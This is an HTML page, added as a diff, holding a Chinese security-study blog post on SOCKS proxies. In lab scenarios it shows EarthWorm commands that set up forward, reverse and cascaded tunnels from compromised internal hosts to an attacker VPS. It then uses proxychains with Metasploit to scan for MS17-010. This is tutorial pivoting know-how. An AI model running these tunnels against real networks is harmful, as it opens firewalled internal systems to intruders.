@@ -1,0 +1,631 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>内网安全学习四-SOCKS代理 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="内网安全学习四-SOCKS代理">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-04-05 19:59" pubdate>
+        2021年4月5日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      24
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">内网安全学习四-SOCKS代理</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年4月6日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="1-SOCKS代理简介"><a href="#1-SOCKS代理简介" class="headerlink" title="1.SOCKS代理简介"></a>1.SOCKS代理简介</h1><p>​    SOCKS是一种代理服务，可以简单的将系统的一端连接到另一端。</p>
+<p>​    常见的SOCKS支持的协议：包括HTTP、FTP等。SOCKS分为SOCKS4和SOCKS5两种类型：其中SOCKS4只支持TCP协议；SOCKS5不仅支持TCP/UDP协议，还支持各种身份验证机制等，其标准的端口为1080。SOCKS能够目标内网计算机进行通信，避免多次使用端口转发。</p>
+<p>SOCKS代理常见的应用场景有如下三类：</p>
+<p>1.服务器在内网中，可以任意访问外部网络。</p>
+<p>2.服务器在内网中，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。</p>
+<p>3.服务器在内网中，对外只开放了部分端口（例如80端口），且服务器不能访问外部网络 。</p>
+<h1 id="2-常见的SOCKS代理工具"><a href="#2-常见的SOCKS代理工具" class="headerlink" title="2.常见的SOCKS代理工具"></a>2.常见的SOCKS代理工具</h1><h2 id="1-EarthWorm"><a href="#1-EarthWorm" class="headerlink" title="1.EarthWorm"></a>1.EarthWorm</h2><p>​    EW是一套便携式网络工具，具有SOCKS5服务架设和端口转发两大核心功能。能够以正向、反向、多级级联等方式建立网络隧道。EW工具包提供了多个可执行文件，适用于不同的操作系统。</p>
+<p>下载链接：<a target="_blank" rel="noopener" href="https://github.com/rootkiter/EarthWorm">https://github.com/rootkiter/EarthWorm</a>       <a target="_blank" rel="noopener" href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p>
+<p>​    EW共有六种命令格式，分别是ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran。其中用于普通的网路环境的正向命令是ssocksd，用于反弹连接的命令是rcsocks、rssocks，其他命令用于复杂网络环境的多级级联。</p>
+<h2 id="2-使用方式"><a href="#2-使用方式" class="headerlink" title="2.使用方式"></a>2.使用方式</h2><h3 id="1-正向SOCKS-5服务器"><a href="#1-正向SOCKS-5服务器" class="headerlink" title="1.正向SOCKS 5服务器"></a>1.正向SOCKS 5服务器</h3><p>以下命令适用于目标机器拥有一个外网IP地址的情况：</p>
+<p>将ew对应操作系统的可执行文件上传到目标机器上并执行如下命令，即可在目标上架设一个端口888的SOCKS代理了，接下来在攻击者的机器上用SocksCap64（For win）或者proxychains（For Linux）</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ew</span> <span class="hljs-selector-tag">-s</span> <span class="hljs-selector-tag">ssocksd</span> <span class="hljs-selector-tag">-l</span> 888<br><br><span class="hljs-selector-tag">proxychains</span> <span class="hljs-selector-tag">ping</span> <span class="hljs-selector-tag">iz9jlx</span><span class="hljs-selector-class">.dnslog</span><span class="hljs-selector-class">.cn</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/1.png" srcset="/img/loading.gif"></p>
+<h3 id="2-反弹SOCKS-5服务器"><a href="#2-反弹SOCKS-5服务器" class="headerlink" title="2.反弹SOCKS 5服务器"></a>2.反弹SOCKS 5服务器</h3><p>当目标机器没有公网IP地址的时候可以利用该方法，使得我们可以访问内网资源。</p>
+<p>假设实验环境如下：</p>
+<p>1.VPS的公网IP是（Linux）：172.16.56.1</p>
+<p>2.目标web服务器（win7）：公网IP—&gt;172.16.56.135    内网IP—-&gt;172.16.55.135。</p>
+<p>3.内网的另一台机器（win2008）：内网IP—&gt;172.16.55.141。</p>
+<p>实验目标：让VPS能够访问内网IP为172.16.55.141的机器。</p>
+<h4 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h4><p>1.首先将EW上传到攻击者的VPS上，然后执行如下命令：该命令的意思是在公网VPS上添加一个转接隧道，把1080端口收到的代理请求转发888端口。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">./ew_for_linux</span> <span class="hljs-string">-s</span> <span class="hljs-string">rcsocks</span> <span class="hljs-string">-l</span> <span class="hljs-number">1080</span> <span class="hljs-string">-e</span> <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/2.png" srcset="/img/loading.gif"></p>
+<p>2.将EW上传到有公网IP和内网IP的windows7 的web服务器上，并执行如下命令：该命令的意思实在该机器上启动SOCKS 5 服务，然后反弹到公网VPS的4444端口上。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rssocks -d 公网VPS的IP -e <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>
+<p>3.可以看到反弹成功了，现在就可以通过访问公网VPS机器的1080端口，使用假设在内网WIN7上的SOCKS 5的代理服务了。</p>
+<p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/3.png" srcset="/img/loading.gif"></p>
+<h3 id="3-二级网络环境（内网有主机拥有公网IP）"><a href="#3-二级网络环境（内网有主机拥有公网IP）" class="headerlink" title="3.二级网络环境（内网有主机拥有公网IP）"></a>3.二级网络环境（内网有主机拥有公网IP）</h3><p>​    假设现在获取了内网环境中两台主机（分别为A主机和B主机）的权限，A主机配有两张网卡，一块能够连接外网，另一块只能连接内网中的一台主机（B主机），但无法访问内网中的其他资源。B主机可以访问内网的任何资源，但是无法访问外网。</p>
+<p>A主机：有公网IP—–&gt;172.16.56.135，内网IP——&gt;172.16.55.135，只能访问B主机，不能访问其他资源。</p>
+<p>B主机：有内网IP—–&gt;172.16.55.141 可以访问内网中任何资源，但是不能访问外网。</p>
+<p>实验目标：在B主机上搭建SOCKS代理服务，让攻击者可以访问内网中的任意资源。</p>
+<h4 id="实验步骤：-1"><a href="#实验步骤：-1" class="headerlink" title="实验步骤："></a>实验步骤：</h4><p>1.首先将EW上传到B主机上，利用ssocksd方式启动888端口的SOCKS代理，命令如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s ssocksd -l <span class="hljs-number">888</span><br></code></pre></td></tr></table></figure>
+<p>2.然后将EW上传到A主机中，执行如下命令：该命令的意思是将A主机的1080端口受到的代理请求转发给B主机（172.16.55.141）的888端口。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_tran -l <span class="hljs-number">1080</span> -f B主机的内网IP -g <span class="hljs-number">888</span><br></code></pre></td></tr></table></figure>
+<p>现在就可以通过访问A主机（公网IP）的1080端口使用在B主机上架设的SOCKS 5代理了。</p>
+<h3 id="4-二级网络环境（内网中不存在拥有公网IP的主机）"><a href="#4-二级网络环境（内网中不存在拥有公网IP的主机）" class="headerlink" title="4.二级网络环境（内网中不存在拥有公网IP的主机）"></a>4.二级网络环境（内网中不存在拥有公网IP的主机）</h3><p>​    假设现在获取了内网环境中两台主机（分别为A主机和B主机）的权限，A主机配有一张内网网卡，但无法访问内网中的其他资源。B主机可以访问内网的任何资源，但是无法访问外网。</p>
+<p>VPS主机：<code>49.*.*.234</code></p>
+<p>A主机：内网IP——&gt;172.16.55.135，不能访问内网其他资源，但是能够访问外网。</p>
+<p>B主机：有内网IP—–&gt;172.16.55.141 可以访问内网中任何资源，但是不能访问外网。</p>
+<p>实验目标：在B主机上搭建SOCKS代理服务，让攻击者可以访问内网中的任意资源。</p>
+<h4 id="实验步骤：-2"><a href="#实验步骤：-2" class="headerlink" title="实验步骤："></a>实验步骤：</h4><p>1.首先将EW上传到我们的VPS主机上，执行如下命令：该命令的意思是在公网VPS上添加一条转接隧道，将13443端口收到的代理请求转发给6666端口。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_listen -l <span class="hljs-number">13443</span> -e <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/4.png" srcset="/img/loading.gif"></p>
+<p>2.接着将EW上传到B主机上，利用ssocksd方式启动1080端口的SOCKS代理服务，命令如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s ssocksd -l <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure>
+<p>3.最后将EW上传到A主机上，执行如下命令：该命令的意思是在主机上利用<code>lcx_slave</code>方式，将公网VPS的6666端口和B主机的1080端口连接起来。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_slave -d <span class="hljs-number">49</span>.*.*.<span class="hljs-number">234</span> -e <span class="hljs-number">6666</span>  -f <span class="hljs-number">172.16.55.141</span>(B主机) -g <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="5-三级网络环境"><a href="#5-三级网络环境" class="headerlink" title="5.三级网络环境"></a>5.三级网络环境</h3><p>​    假设现在获取了内网环境中三台主机（分别为A主机和B主机，以及C主机）的权限，A主机配有一张内网网卡，可以访问B主机以及外网。B主机可以访问C主机，但是无法访问外网。C主机可以访问核心区域，同时可以被B主机访问。</p>
+<p>VPS主机：<code>49.*.*.234</code></p>
+<p>A主机：内网IP——&gt;172.16.55.135，只能访问B主机和外网，不能访问其他资源。</p>
+<p>B主机：有内网IP—–&gt;172.16.55.141 只可以访问C主机。</p>
+<p>C主机：有内网IP—–&gt;172.16.55.126，只可以访问核心区域。</p>
+<p>实验目标：在C主机上搭建SOCKS代理服务，让攻击者可以访问内网中的核心区域。</p>
+<h4 id="实验步骤：-3"><a href="#实验步骤：-3" class="headerlink" title="实验步骤："></a>实验步骤：</h4><p>1.首先将EW上传到VPS上，执行如下命令：将1080端口受到的代理请求转发到13443端口。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rcsocks -l <span class="hljs-number">1080</span> -e <span class="hljs-number">13443</span><br></code></pre></td></tr></table></figure>
+<p>2.将EW上传到A主机上，执行如下命令：将公网VPS的13443端口和B主机上的999端口连接起来。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_slave -d <span class="hljs-number">49</span>.*.*.<span class="hljs-number">240</span> -e <span class="hljs-number">13443</span> -f <span class="hljs-number">172.16.55.141</span> -g <span class="hljs-number">999</span><br></code></pre></td></tr></table></figure>
+<p>3.将EW上传到B主机上，执行如下命令：将999端口受到的代理请求转发到777端口。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_listen -l <span class="hljs-number">999</span> -e <span class="hljs-number">777</span><br></code></pre></td></tr></table></figure>
+<p>4.将EW上传到C主机上，并执行如下命令：在C主机上启动SOCKS 5服务，并反弹到B主机的777端口上。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rssocks -d <span class="hljs-number">172.16.55.141</span> -e <span class="hljs-number">777</span><br></code></pre></td></tr></table></figure>
+<p>现在，就可以通过访问公网VPS（<code>49.*.*.234</code>）的1080端口使用C主机上架设的SOCKS 5 代理了。</p>
+<h1 id="3-使用ProxyChains（Linux）使用架设的SOCKS代理"><a href="#3-使用ProxyChains（Linux）使用架设的SOCKS代理" class="headerlink" title="3.使用ProxyChains（Linux）使用架设的SOCKS代理"></a>3.使用ProxyChains（Linux）使用架设的SOCKS代理</h1><h4 id="使用步骤："><a href="#使用步骤：" class="headerlink" title="使用步骤："></a>使用步骤：</h4><p>1.安装<code>proxychains</code>。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-builtin-name">get</span> install proxychains<br></code></pre></td></tr></table></figure>
+<p>2.启用<code>dynamic_chain</code></p>
+<p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/5.png" srcset="/img/loading.gif"></p>
+<p>3.修改<code>/etc/proxychains.conf</code>里的SOCKS代理服务器的IP以及端口</p>
+<p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/6.png" srcset="/img/loading.gif"></p>
+<p>4.利用<code>proxyresolv</code>命令测试代理服务器是否正常。</p>
+<p>首先将该命令复制到<code>/usr/bin/</code>目录下</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cp <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/proxychains3/</span>proxyresolv <span class="hljs-regexp">/usr/</span>bin/<br></code></pre></td></tr></table></figure>
+<p>测试命令。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">proxyresolv</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/7.png" srcset="/img/loading.gif"></p>
+<p>代理服务器上的数据转发正常</p>
+<p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/8.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/9.png" srcset="/img/loading.gif"></p>
+<p>5.尝试使用代理启动MSF</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">proxychains msfconsole</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/10.png" srcset="/img/loading.gif"></p>
+<p>成功利用SOCKS 5代理对内网的主机进行MS17-010漏洞探测。</p>
+<p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/11.png" srcset="/img/loading.gif"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">简单加密+分离+进程注入绕过杀软</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/">
+                        <span class="hidden-mobile">Java安全-Java动态加载字节码方法</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
